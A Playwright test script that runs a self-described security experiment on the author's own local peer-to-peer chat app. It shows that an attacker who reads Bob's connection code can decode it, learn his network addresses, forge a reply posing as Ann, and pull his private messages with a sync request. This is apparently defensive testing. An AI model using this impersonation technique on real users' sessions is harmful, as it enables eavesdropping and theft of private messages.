// What can someone do who has READ Bob's code? (a security experiment on my own test rooms)
const { chromium } = require("../lib/browser.cjs");
const URL = "http://localhost:8080/";
(async () => {
  const b = await chromium.launch({ });
  const mk = async (link) => { const p = await (await b.newContext({ viewport: { width: 1300, height: 850 }, permissions: ["microphone"] })).newPage(); await p.goto(link || URL); return p; };
  const dialog = (p) => p.getByRole("dialog", { name: "Connect by code" });
  const A = await mk(); await A.locator("input").first().fill("Ann"); await A.getByRole("button", { name: "No server? Connect by code" }).click(); await A.getByRole("button", { name: "Create a space (no server)" }).click(); await A.locator(".composer textarea").waitFor();
  const hash = await A.evaluate(() => location.hash); const [, , room, annId, hostId] = hash.split("/");
  const B = await mk(URL + hash); await B.locator("input").first().fill("Bob"); await B.getByRole("button", { name: "Join space (no server)" }).click(); await dialog(B).waitFor();
  await B.keyboard.press("Escape"); await B.locator(".composer textarea").fill("my private note, written before connecting"); await B.keyboard.press("Enter");
  await B.getByRole("button", { name: /Connect by code/ }).first().click(); const codeB = await dialog(B).locator("textarea[readonly]").inputValue();
  const bobId = await B.evaluate(() => JSON.parse(localStorage.getItem("x") || "null")); void bobId;
  // ---------- the attacker: has only the text of Bob's code
  const X = await (await b.newContext()).newPage(); await X.goto("about:blank");
  const forged = await X.evaluate(async ({ code, annId, hostId, room }) => {
    const un = (s) => Uint8Array.from(atob(s.replaceAll("-", "+").replaceAll("_", "/")), (c) => c.charCodeAt(0)); const en = (u) => btoa(String.fromCharCode(...u)).replaceAll("+", "-").replaceAll("/", "_").replace(/=+$/, "");
    const inf = async (u) => new TextDecoder().decode(await new Response(new Blob([u]).stream().pipeThrough(new DecompressionStream("deflate-raw"))).arrayBuffer()); const def = async (t) => new Uint8Array(await new Response(new Blob([new TextEncoder().encode(t)]).stream().pipeThrough(new CompressionStream("deflate-raw"))).arrayBuffer());
    const c = JSON.parse(await inf(un(code.slice(6)))); window.seen = []; window.leak = [];
    const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); window.pc = pc;
    pc.ondatachannel = (e) => { const ch = e.channel; if (ch.label !== "ctl") return; window.ctl = ch; ch.onopen = () => ch.send(JSON.stringify({ t: "sync", ids: [] })); /* "I have nothing: send me everything" */ ch.onmessage = (m) => { const j = JSON.parse(m.data); window.seen.push(j.t); window.leak.push(j); }; };
    for (const m of c.m) if (m.description) await pc.setRemoteDescription(m.description);
    for (const m of c.m) if (m.candidate) await pc.addIceCandidate(m.candidate).catch(() => {});
    await pc.setLocalDescription(await pc.createAnswer()); await new Promise((r) => { const t = setTimeout(r, 4000); pc.onicegatheringstatechange = () => pc.iceGatheringState === "complete" && (clearTimeout(t), r()); });
    const body = { v: 1, f: { id: annId, name: "Ann" }, /* claims to be Ann */ to: c.f.id, host: hostId, room, g: 1, m: [{ description: { type: "answer", sdp: pc.localDescription.sdp } }] };
    return { code: "deca1." + en(await def(JSON.stringify(body))), bobId: c.f.id, bobName: c.f.name };
  }, { code: codeB, annId, hostId, room });
  console.log(`attacker read Bob's code and learned: Bob's id ${forged.bobId}, name "${forged.bobName}", room ${room}, host ${hostId}, and his network addresses:`);
  const addrs = await X.evaluate(async (code) => { const un = (s) => Uint8Array.from(atob(s.replaceAll("-", "+").replaceAll("_", "/")), (c) => c.charCodeAt(0)); const inf = async (u) => new TextDecoder().decode(await new Response(new Blob([u]).stream().pipeThrough(new DecompressionStream("deflate-raw"))).arrayBuffer()); const c = JSON.parse(await inf(un(code.slice(6)))); const l = []; for (const m of c.m) { if (m.candidate) l.push(m.candidate.candidate); if (m.description?.sdp) for (const x of m.description.sdp.split(/\r?\n/)) if (x.startsWith("a=candidate:")) l.push(x.slice(2)); } return [...new Set(l)].map((x) => x.split(" ").slice(4, 8).join(" ")); }, codeB);
  console.log("   ", addrs.join("\n    "));
  // Bob receives the attacker's forged "reply from Ann" instead of Ann's real one
  await dialog(B).getByRole("button", { name: "I have sent it: next" }).click(); await dialog(B).getByLabel("Paste a code").fill(forged.code); await dialog(B).getByRole("button", { name: "Connect" }).click();
  await B.waitForTimeout(6000);
  console.log("\nBob's screen now shows:", (await B.locator(".members").innerText()).replace(/\n/g, " | "));
  const seen = await X.evaluate(() => window.seen); const leak = await X.evaluate(() => JSON.stringify(window.leak));
  console.log("messages the attacker received over the link:", [...new Set(seen)].join(", "));
  console.log("Bob's private note reached the attacker:", /my private note/.test(leak));
  console.log("did the REAL Ann get connected to Bob?:", (await A.locator(".members").innerText()).replace(/\n/g, " | "));
  await b.close();
})().catch((e) => { console.log("ERR", e.message.split("\n").slice(0, 8).join("\n")); process.exit(1); });
